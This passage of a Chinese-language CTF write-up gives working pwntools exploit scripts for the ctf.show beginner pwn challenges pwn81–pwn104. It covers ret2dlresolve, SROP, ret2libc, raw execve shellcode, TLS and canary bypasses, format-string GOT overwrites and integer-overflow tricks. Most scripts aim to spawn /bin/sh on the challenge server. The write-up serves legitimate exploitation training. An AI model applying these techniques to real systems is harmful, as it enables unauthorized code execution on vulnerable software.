import*<br>elf=ELF(&#x27;./pwn81&#x27;)<br>libc=ELF(&#x27;./pwn81libc.so&#x27;)<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28243)<br><br>io.recvuntil(&#x27;simple,O.o\n&#x27;)<br>system=int(io.recvline(),16)<br>print(system)<br><br>libc_base=system-libc.sym[&#x27;system&#x27;]<br>bin_sh=libc_base+next(libc.search(&#x27;/bin/sh\x00&#x27;))<br>rdi=libc_base+0x02164f<br>ret=libc_base+0x008aa<br><br>payload=cyclic(0x80+8)+p64(ret)+p64(rdi)+p64(bin_sh)+p64(system)+p64(0)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn82"><a href="#pwn82" class="headerlink" title="pwn82"></a>pwn82</h2><p>打ret2dlresolve，因为是No RELRO，因此可以修改.dynamic节</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28160)<br>elf=ELF(&#x27;./pwn82&#x27;)<br>rop=ROP(&#x27;./pwn82&#x27;)<br><br>elf_strtab=0x08049804<br>bss=0x080498E0<br>read_plt_first=0x08048376<br><br>io.recvuntil(&#x27;Welcome to CTFshowPWN!\n&#x27;)<br>rop.raw(b&#x27;a&#x27;*112)<br>rop.read(0,elf_strtab+4,4)<br><br>dynstr=elf.get_section_by_name(&#x27;.dynstr&#x27;).data()<br>dynstr=dynstr.replace(b&#x27;read&#x27;,b&#x27;system&#x27;)<br>rop.read(0,bss,len(dynstr))<br><br>rop.read(0,bss+0x100,len(&#x27;/bin/sh\x00&#x27;))<br><br>rop.raw(read_plt_first)<br>rop.raw(0xdeafbeef)<br>rop.raw(bss+0x100)<br><br>assert(len(rop.chain())&lt;=256)<br>rop.raw(b&#x27;a&#x27;*(256-len(rop.chain())))<br><br>io.send(rop.chain())<br>io.send(p32(bss))<br>io.send(dynstr)<br>io.send(b&#x27;/bin/sh\x00&#x27;)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="pwn83"><a href="#pwn83" class="headerlink" title="pwn83"></a>pwn83</h2><p>开启了Partial RELRO，因此.dynamic节不可写了，可以伪造重定位表项来获取目标函数。</p><p>基于工具：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import *<br>context.log_level = &#x27;debug&#x27;<br>#io = process(&quot;./pwn&quot;)<br>io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28126)<br>elf = ELF(&#x27;./pwn83&#x27;)<br>rop = ROP(&#x27;./pwn83&#x27;)<br>dlresolve = Ret2dlresolvePayload(elf,symbol=&quot;system&quot;,args=[&quot;/bin/sh&quot;])<br>rop.read(0,dlresolve.data_addr)<br>rop.ret2dlresolve(dlresolve)<br>raw_rop = rop.chain()<br>io.recvuntil(&quot;Welcome to CTFshowPWN!\n&quot;)<br>payload = flat(&#123;112:raw_rop,256:dlresolve.payload&#125;)<br>io.sendline(payload)<br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn84"><a href="#pwn84" class="headerlink" title="pwn84"></a>pwn84</h2><p>64位的ret2dlresolve，No RELRO</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import *<br>context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)<br>elf = ELF(&quot;./pwn84&quot;)<br>io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28124)<br><br>bss_addr = elf.bss()<br>print(hex(bss_addr))<br>csu_front_addr = 0x400750<br>csu_end_addr = 0x40076A<br>leave_ret = 0x40063c<br>pop_rbp = 0x400588<br>show = 0x400607<br>pop_rsi_r15 = 0x400771<br>pop_rdi = 0x400773<br>read_plt0=0x400516<br>def csu(rbx,rbp,r12,r13,r14,r15):<br>    # pop rbx, rbp, r12, r13, r14, r15<br>    # rbx = 0<br>    # rbp = 1, enable not to jump<br>    # r12 should be the function that you want to call<br>    # rdi = edi = r13<br>    # rsi = r14<br>    # rdx =r15<br>    payload=p64(csu_end_addr)<br>    payload+=p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)<br>    payload+=p64(csu_front_addr)<br>    payload+=b&#x27;a&#x27;*0x38<br>    return payload<br>io.recvuntil(b&quot;Welcome to CTFshowPWN!\n&quot;)<br>stack_size = 0x200<br>new_stack = bss_addr + 0x100<br>rop = ROP(&#x27;./pwn84&#x27;)<br>offset = 112 + 8<br>rop.raw(b&#x27;a&#x27;*offset)<br>rop.raw(csu(0,1,elf.got[&#x27;read&#x27;],0,0x600988+8,8))<br>rop.raw(show)<br>rop.raw(b&#x27;a&#x27;*(256-len(rop.chain())))<br>assert(len(rop.chain())&lt;=256)<br>rop.raw(b&#x27;a&#x27;*(256-len(rop.chain())))<br>io.send(rop.chain())<br>io.send(p64(bss_addr+0x100))<br><br>#fake dynstr<br>rop = ROP(&quot;./pwn84&quot;)<br>rop.raw(b&#x27;a&#x27;*offset)<br>dynstr = elf.get_section_by_name(&#x27;.dynstr&#x27;).data()<br>dynstr = dynstr.replace(b&quot;read&quot;,b&quot;system&quot;)<br>rop.raw(csu(0,1,elf.got[&#x27;read&#x27;],0,bss_addr+0x100,len(dynstr)))<br>rop.raw(show)<br>rop.raw(b&#x27;a&#x27;*(256-len(rop.chain())))<br>io.send(rop.chain())<br>io.send(dynstr)<br><br>#read /bin/sh<br>rop = ROP(&quot;./pwn84&quot;)<br>rop.raw(b&#x27;a&#x27;*offset)<br>rop.raw(csu(0,1,elf.got[&#x27;read&#x27;],0,bss_addr+0x100+len(dynstr),len(b&quot;/bin/sh\x00&quot;)))<br>rop.raw(show)<br>rop.raw(b&#x27;a&#x27;*(256-len(rop.chain())))<br>io.send(rop.chain())<br>io.send(b&#x27;/bin/sh\x00&#x27;)<br><br>rop = ROP(&quot;./pwn84&quot;)<br>rop.raw(b&#x27;a&#x27;*offset)<br>rop.raw(pop_rsi_r15)<br>rop.raw(0)<br>rop.raw(0)<br>rop.raw(pop_rdi)<br>rop.raw(bss_addr+0x100+len(dynstr))<br>rop.raw(read_plt0)<br>rop.raw(0)<br>rop.raw(b&#x27;a&#x27;*(256-len(rop.chain())))<br>io.send(rop.chain())<br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn85"><a href="#pwn85" class="headerlink" title="pwn85"></a>pwn85</h2><p>64位的ret2dlresolve，Partial RELRO</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import *<br>context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)<br>elf = ELF(&quot;./pwn85&quot;)<br>io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28117)<br>bss_addr = elf.bss()<br>print(hex(bss_addr))<br>csu_front_addr = 0x400780<br>csu_end_addr = 0x40079A<br>show = 0x400637<br><br>pop_rdi = 0x4007a3<br>def csu(rbx,rbp,r12,r13,r14,r15):<br>    # pop rbx, rbp, r12, r13, r14, r15<br>    # rbx = 0<br>    # rbp = 1, enable not to jump<br>    # r12 should be the function that you want to call<br>    # rdi = edi = r13<br>    # rsi = r14<br>    # rdx =r15<br>    payload=p64(csu_end_addr)<br>    payload+=p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)<br>    payload+=p64(csu_front_addr)<br>    payload+=b&#x27;\x00&#x27;*0x38<br>    return payload<br>def ret2dlresolve_x64(elf,store_addr,func_name,resolve_addr):<br>    plt0 = elf.get_section_by_name(&#x27;.plt&#x27;).header.sh_addr<br>    <br>    rel_plt = elf.get_section_by_name(&#x27;.rela.plt&#x27;).header.sh_addr<br>    <br>    relaent = elf.dynamic_value_by_tag(&quot;DT_RELAENT&quot;) #重定位表大小<br>    <br>    dynsym = elf.get_section_by_name(&#x27;.dynsym&#x27;).header.sh_addr<br>    syment = elf.dynamic_value_by_tag(&quot;DT_SYMENT&quot;) #符号表大小<br>    <br>    dynstr = elf.get_section_by_name(&#x27;.dynstr&#x27;).header.sh_addr<br>    <br>    <br>    # 创造fake函数字符<br>    func_string_addr = store_addr<br>    resolve_data = func_name + b&quot;\x00&quot;<br>    <br>    # 创造fake symbol<br>    symbol_addr = store_addr+len(resolve_data)<br>    offset = symbol_addr - dynsym<br>    pad = syment - offset % syment # align syment size<br>    symbol_addr = symbol_addr+pad<br>    symbol = p32(func_string_addr-dynstr)+p8(0x12)+p8(0)+p16(0)+p64(0)+p64(0)<br>    symbol_index = (symbol_addr - dynsym)//24<br>    resolve_data += b&#x27;\x00&#x27;*pad<br>    resolve_data += symbol<br>    <br>    #创造fake reloc<br>    reloc_addr = store_addr+len(resolve_data)<br>    offset = reloc_addr - rel_plt<br>    pad = relaent - offset%relaent # align relaent size<br>    reloc_addr +=pad<br>    reloc_index = (reloc_addr-rel_plt)//24<br>    rinfo = (symbol_index&lt;&lt;32) | 7<br>    write_reloc = p64(resolve_addr)+p64(rinfo)+p64(0)<br>    resolve_data += b&#x27;\x00&#x27;*pad<br>    resolve_data +=write_reloc<br>    <br>    resolve_call = p64(plt0) + p64(reloc_index)<br>    return resolve_data,resolve_call<br><br><br>io.recvuntil(&quot;Welcome to CTFshowPWN!\n&quot;)<br>store_addr = bss_addr + 0x100<br>sh = b&quot;/bin/sh\x00&quot;<br><br>#创造fake string,symbol,修改.dynamic部分中的.dynstr指针到特定位置。<br>rop = ROP(&quot;./pwn85&quot;)<br>offset = 112+8<br>rop.raw(b&#x27;\x00&#x27;*offset)<br>resolve_data,resolve_call = ret2dlresolve_x64(elf,store_addr,b&quot;system&quot;,elf.got[&#x27;write&#x27;])<br>rop.raw(csu(0,1,elf.got[&#x27;read&#x27;],0,store_addr,len(resolve_data)+len(sh)))<br>rop.raw(show)<br>rop.raw(b&#x27;\x00&#x27;*(256-len(rop.chain())))<br>assert(len(rop.chain())&lt;=256)<br>io.send(rop.chain())<br><br>io.send(resolve_data+sh)<br><br>bin_sh_addr = store_addr + len(resolve_data)<br><br>#泄露link_map addr<br>rop = ROP(&#x27;./pwn85&#x27;)<br>rop.raw(b&#x27;\x00&#x27;*offset)<br>rop.raw(csu(0,1,elf.got[&#x27;write&#x27;],1,0x601008,8))<br>rop.raw(show)<br>rop.raw(b&#x27;\x00&#x27;*(256-len(rop.chain())))<br>io.send(rop.chain())<br>link_map_addr = u64(io.recv(8))<br>print(hex(link_map_addr))<br><br># set l-&gt;l_info[VERSYMIDX(DT_VERSYM)] = NULL<br>rop = ROP(&#x27;./pwn85&#x27;)<br>rop.raw(b&#x27;\x00&#x27;*offset)<br>rop.raw(csu(0,1,elf.got[&#x27;read&#x27;],0,link_map_addr+0x1c8,8))<br>rop.raw(show)<br>io.sendline(rop.chain())<br>sleep(1)<br>io.send(p64(0))<br><br>rop = ROP(&#x27;./pwn85&#x27;)<br>rop.raw(b&#x27;\x00&#x27;*offset)<br>rop.raw(pop_rdi)<br>rop.raw(bin_sh_addr)<br>rop.raw(resolve_call)<br>io.send(rop.chain())<br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn86"><a href="#pwn86" class="headerlink" title="pwn86"></a>pwn86</h2><p>打SROP</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)<br>elf=ELF(&#x27;./pwn86&#x27;)<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28285)<br><br>str_bin_sh_offset=0x100<br><br>frame = SigreturnFrame()<br>frame.rax = constants.SYS_execve<br>frame.rdi = elf.symbols[&#x27;global_buf&#x27;] + str_bin_sh_offset<br>frame.rsi = 0<br>frame.rdx = 0<br>frame.rip = elf.symbols[&#x27;syscall&#x27;]<br>io.send(bytes(frame).ljust(str_bin_sh_offset, b&#x27;a&#x27;) + b&#x27;/bin/sh\x00&#x27;)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn87"><a href="#pwn87" class="headerlink" title="pwn87"></a>pwn87</h2><p>花式栈溢出，控制esp执行shellcode</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28115)<br><br>jmp_esp=0x08048d17<br>set_jmp_esp=&#x27;&#x27;&#x27;<br>sub esp,0x28;<br>jmp esp;<br>&#x27;&#x27;&#x27;<br>set_jmp_esp=asm(set_jmp_esp)<br>shellcode=b&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;    #21字节shellcode<br><br>payload=shellcode.ljust(0x24,b&#x27;a&#x27;)+p32(jmp_esp)+set_jmp_esp<br>io.recvuntil(b&#x27;name?&#x27;)<br>io.sendline(payload)<br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn88"><a href="#pwn88" class="headerlink" title="pwn88"></a>pwn88</h2><p>先一字节读写，修改text跳转，改指令为jmp再写入shellcode，再跳转到shellcode并执行。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>context.arch=&#x27;amd64&#x27;<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28272)<br><br>text = 0x400767<br> <br>def writeData(addr,data):<br>    io.sendlineafter(&#x27;Where What?&#x27;,hex(addr) + &#x27; &#x27; + str(data))<br>writeData(text+1,u32(asm(&#x27;jnz $-0x4A&#x27;)[1:].ljust(4,b&#x27;\x00&#x27;)))<br>writeData(text,u32(asm(&#x27;jmp $-0x4A&#x27;)[0:1].ljust(4,b&#x27;\x00&#x27;)))<br>shellcode=asm(shellcraft.sh())<br>shellcode_addr = 0x400769<br>i = 0<br>for x in shellcode:<br>    data = x<br>    writeData(shellcode_addr+i,str(data))<br>    i=i+1<br>writeData(text+1,u32(asm(&#x27;jnz $+0x2&#x27;)[1:].ljust(4,b&#x27;\x00&#x27;)))<br> <br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn89"><a href="#pwn89" class="headerlink" title="pwn89"></a>pwn89</h2><p>劫持TLS绕过canary，前提：溢出字节足够大，通常至少4K，创建一个线程，在线程内栈溢出。原理：在开启canary的情况下，当程序在创建线程的时候，会创建一个TLS（Thread Local Storage），这个TLS会存储canary的值，而TLS会保存在stack高地址的地方。</p><p>那么，当我们溢出足够大的字节覆盖到TLS所在的地方，就可以控制TLS结构体，进而控制canary到我们想要的值，实现ROP。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>elf=ELF(&#x27;./pwn89&#x27;)<br>libc=ELF(&#x27;./pwn89libc.so&#x27;)<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28111)<br><br>bss=0x0602010<br>puts_plt=elf.plt[&#x27;puts&#x27;]<br>puts_got=elf.got[&#x27;puts&#x27;]<br>read_plt=elf.plt[&#x27;read&#x27;]<br>rdi=0x0400be3<br>rsi_r15=0x0400be1<br>ret=0x04006be<br>leave_ret=0x040098c<br><br>payload=b&#x27;a&#x27;*0x1010+p64(bss-0x8)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(rdi)+p64(0)+p64(rsi_r15)+p64(bss)+p64(0)+p64(read_plt)+p64(leave_ret)<br>payload=payload.ljust(0x2000,b&#x27;a&#x27;)<br><br>io.sendlineafter(&quot;send:&quot;,str(0x2000))<br>io.send(payload)<br><br>puts=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>print(hex(puts))<br>libc_base=puts-libc.sym[&#x27;puts&#x27;]<br><br>one_gadget=libc_base+0x10a2fc<br>io.sendline(p64(one_gadget))<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn90"><a href="#pwn90" class="headerlink" title="pwn90"></a>pwn90</h2><p>泄漏canary的值再修改返回地址到后门函数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28302)<br><br>io.sendlineafter(&quot;CTFshow:&quot;,b&#x27;a&#x27;*40)<br>io.recvuntil(&#x27;a&#x27;*40)<br>canary=u64(io.recv(8))-0xa<br><br>print(hex(canary))<br><br>payload=cyclic(40)+p64(canary)+p64(0)+b&#x27;\x42&#x27;<br>io.send(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h1><h2 id="pwn91"><a href="#pwn91" class="headerlink" title="pwn91"></a>pwn91</h2><p>简单的格式化字符串漏洞。利用漏洞向目标地址写入数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28259)<br><br>daniu=0x0804B038<br>payload=fmtstr_payload(7,&#123;daniu:6&#125;)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn92"><a href="#pwn92" class="headerlink" title="pwn92"></a>pwn92</h2><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn92.png"></p><p>存在格式化字符串漏洞，直接输入%s获得flag即可。</p><h2 id="pwn93"><a href="#pwn93" class="headerlink" title="pwn93"></a>pwn93</h2><p>也简单的介绍了格式化字符串的一些东西，当然想要获得flag很容易，直接输入7即可。</p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn93_1.png"></p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn93_2.png"></p><h2 id="pwn94"><a href="#pwn94" class="headerlink" title="pwn94"></a>pwn94</h2><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn94_1.png"></p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn94_2.png"></p><p>存在格式化字符串漏洞，且存在system函数，由于输入长度有限，因此无法造成栈溢出。那么就可以利用格式化字符串漏洞实现任意写，将printf.got指向的地址改为system.plt，这样一来当再次执行printf()时，就相当于执行system()。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>elf=ELF(&#x27;./pwn94&#x27;)<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28256)<br><br>printf_got = elf.got[&#x27;printf&#x27;]<br>system_plt = elf.plt[&#x27;system&#x27;]<br><br>payload=fmtstr_payload(6,&#123;printf_got:system_plt&#125;)<br>io.sendline(payload)<br><br>io.send(b&#x27;/bin/sh\x00&#x27;)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn95"><a href="#pwn95" class="headerlink" title="pwn95"></a>pwn95</h2><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn95.png"></p><p>这道题没有使用system函数，就不能直接利用system.plt，因此先泄漏libc，再用跟pwn94一样的攻击手法。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>from LibcSearcher import*<br>elf=ELF(&#x27;./pwn95&#x27;)<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28139)<br><br>printf_plt=elf.plt[&#x27;printf&#x27;]<br>printf_got=elf.got[&#x27;printf&#x27;]<br><br>payload1=p32(printf_got)+b&#x27;%6$s&#x27;<br>io.send(payload1)<br><br>printf=u32(io.recvuntil(&#x27;\xf7&#x27;)[-4:])<br>print(hex(printf))<br><br>libc=LibcSearcher(&#x27;printf&#x27;,printf)<br>libc_base=printf-libc.dump(&#x27;printf&#x27;)<br>system=libc_base+libc.dump(&#x27;system&#x27;)<br><br>payload2=fmtstr_payload(6,&#123;printf_got:system&#125;)<br>io.send(payload2)<br><br>io.send(b&#x27;/bin/sh\x00&#x27;)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn96"><a href="#pwn96" class="headerlink" title="pwn96"></a>pwn96</h2><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn96_1.png"></p><p>存在格式化字符串漏洞，看一下flag字符串的偏移</p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn96_2.png"></p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn96_3.png"></p><p>看出来偏移为6~18，由于是小端序，因此逆序输出。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28226)<br>flag=b&#x27;&#x27;<br>for i in range(6,6+12):<br>    payload=&#x27;%&#123;&#125;$p&#x27;.format(str(i))<br>    io.sendlineafter(&quot;$ &quot;,payload)<br>    aim=unhex(io.recvuntil(&#x27;\n&#x27;,drop=True).replace(b&#x27;0x&#x27;,b&#x27;&#x27;))<br>    flag+=aim[::-1]<br>    print(flag)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn97"><a href="#pwn97" class="headerlink" title="pwn97"></a>pwn97</h2><p>一道简单的利用格式化字符串任意写的题。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&quot;pwn.challenge.ctf.show&quot;,28244)<br><br>check=0x0804B040<br>payload=fmtstr_payload(11,&#123;check:1&#125;)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn98"><a href="#pwn98" class="headerlink" title="pwn98"></a>pwn98</h2><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn98_1.png"></p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn98_2.png"></p><p>存在canary，但可以通过printf泄漏canary的值，从而绕过canary保护，且存在后门函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28195)<br><br>backdoor=0x80486CE<br><br>payload=b&#x27;%15$x&#x27;<br>io.recv()<br>io.sendline(payload)<br>canary=int(io.recv(),16)<br>print(hex(canary))<br><br>payload=cyclic(0x28)+p32(canary)+b&#x27;a&#x27;*0xc+p32(backdoor)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn99"><a href="#pwn99" class="headerlink" title="pwn99"></a>pwn99</h2><p>fmt盲打</p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn99_1.png"></p><p>知道flag在栈上，且存在格式化字符串漏洞，因此可以利用该漏洞泄漏flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br><br>def exploit(payload):<br>    io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28307)<br>    io.recv()<br>    io.sendline(payload)<br>    data=io.recvuntil(b&#x27;\n&#x27;,drop=True)<br>    if data.startswith(b&#x27;0x&#x27;):<br>        print(p64(int(data,16)))<br>    io.close()<br><br>i=1<br>while 1:<br>    payload=&#x27;%&#123;&#125;$p&#x27;.format(str(i))<br>    exploit(payload)<br>    i+=1<br>    print(i)<br><br></code></pre></td></tr></table></figure><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn99_2.png"></p><h2 id="pwn100"><a href="#pwn100" class="headerlink" title="pwn100"></a>pwn100</h2><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn100_1.png"></p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn100_4.png"></p><p>一道菜单题目，存在几个函数与后门函数，开启了NX、canary、PIE保护，因此大致思路就是泄漏基地址再修改某函数返回地址为后面函数，直接获得flag。</p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn100_2.png"></p><p>首先是输入时间并打印出来，没有可利用的格式化漏洞</p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn100_3.png"></p><p>存在格式化字符串漏洞利用，但是只能使用一次，因此需要利用该漏洞将a1的值改为0，从而能一直利用该漏洞，那么就需要找到a1的偏移</p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn100_5.png"></p><p>从汇编可以看出，a1在rbp-0x48的位置，利用gdb算出偏移为7</p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn100_6.png"></p><p>因此可以利用%7$n，将a1的值改为0。因为我们将%7$n放在开头，在其之前并没有打印出任何字符，所以个数为0，通过%7$n将这个0写入到a1中，这样一来就可以不断利用该漏洞了。</p><p>因为开启了PIE保护，需要泄漏基址以及返回地址</p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn100_7.png"></p><p>在这里可以看到栈上的rbp存放着main函数的rbp，在rbp+0x8存放着fmt_attack原本的返回地址，因此先泄漏main的rbp算出fmt_attack函数存放返回地址的地址，再泄漏原本的返回地址算出基地址并算出后门函数，最后修改即可。</p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn100_8.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28122)<br>#io=process(&#x27;./pwn100&#x27;)<br><br>io.sendline(b&#x27;1 1 1&#x27;)<br><br>def fmt(payload):<br>    io.sendlineafter(&quot;&gt;&gt;&quot;,b&quot;2&quot;)<br>    io.sendline(payload)<br><br>payload1=b&#x27;%7$n-%17$p&#x27;<br>fmt(payload1)<br>io.recvuntil(b&#x27;-&#x27;)<br>ret_value=int(io.recvuntil(&#x27;\n&#x27;)[:-1],16)<br>print(hex(ret_value))<br>base_addr=ret_value-0x102c<br><br>payload2=b&#x27;%7$n-%16$p&#x27;<br>fmt(payload2)<br>io.recvuntil(b&#x27;-&#x27;)<br>ret_addr=int(io.recvuntil(&#x27;\n&#x27;)[:-1],16)-0x28<br>print(hex(ret_addr))<br><br>payload3=b&#x27;%&#x27;+str((base_addr+0xf56)&amp;0xffff).encode()+b&#x27;c%10$hn&#x27;<br>payload3=payload3.ljust(0x10,b&#x27;a&#x27;)<br>payload3=payload3+p64(ret_addr)<br><br>fmt(payload3)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="整数安全"><a href="#整数安全" class="headerlink" title="整数安全"></a>整数安全</h1><h2 id="pwn101"><a href="#pwn101" class="headerlink" title="pwn101"></a>pwn101</h2><p>本题主要考察整数类型的一些东西。</p><table><thead><tr><th>char</th><th>（与 signed char 或 unsigned char 相同）</th><th></th><th></th></tr></thead><tbody><tr><td>unsigned char</td><td>1个字节</td><td>0</td><td>255</td></tr><tr><td>signed char</td><td>1个字节</td><td>-128</td><td>127</td></tr><tr><td>int</td><td>2个或4个字节</td><td>-32 768 或 -2 147 483 648</td><td>32767 或 2 147 483 647</td></tr><tr><td>unsigned int</td><td>2个或4个字节</td><td>0</td><td>65 535 或 4 294 967 295</td></tr><tr><td>short</td><td>2个字节</td><td>-32 768</td><td>32 767</td></tr><tr><td>unsigned short</td><td>2个字节</td><td>0</td><td>65 535</td></tr><tr><td>long</td><td>4个字节</td><td>-2 147 483 648</td><td>2 147 483 647</td></tr><tr><td>unsigned long</td><td>4个字节</td><td>0</td><td>4 294 967 295</td></tr><tr><td>long long (C99)</td><td>8个字节</td><td>-9 223 372 036 854 775 808</td><td>9 223 372 036 854 775 807</td></tr><tr><td>Unsigned long long (C99)</td><td>8个字节</td><td>0</td><td>18 446 744 073 709 551 615</td></tr></tbody></table><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8101.png"></p><p>输入两给数且符合条件，则获得flag。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28136)<br>payload=b&#x27;-2147483648 2147483647&#x27;<br>io.sendlineafter(b&quot;integers: &quot;,payload)<br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn102"><a href="#pwn102" class="headerlink" title="pwn102"></a>pwn102</h2><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8102.png"></p><p>也是一道简单的整数安全，输入的数据符合条件即可获得flag。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28270)<br><br>io.sendlineafter(b&#x27;integer: &#x27;,b&#x27;4294967295&#x27;)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn103"><a href="#pwn103" class="headerlink" title="pwn103"></a>pwn103</h2><p>一样的简单题目，直接上exp</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28223)<br><br>io.sendline(b&#x27;0&#x27;)<br>io.sendline(b&#x27;-1&#x27;)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn104"><a href="#pwn104" class="headerlink" title="pwn104"></a>pwn104</h2><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8104_1.png"></p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8104_2.png"></p><p>存在整数安全，因为执行read函数时，nbytes为unsigned int类型，而输入时为int类型，因此可以输入-1使nbytes的值变为非常大的正数，造成栈溢出，存在后门函数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn 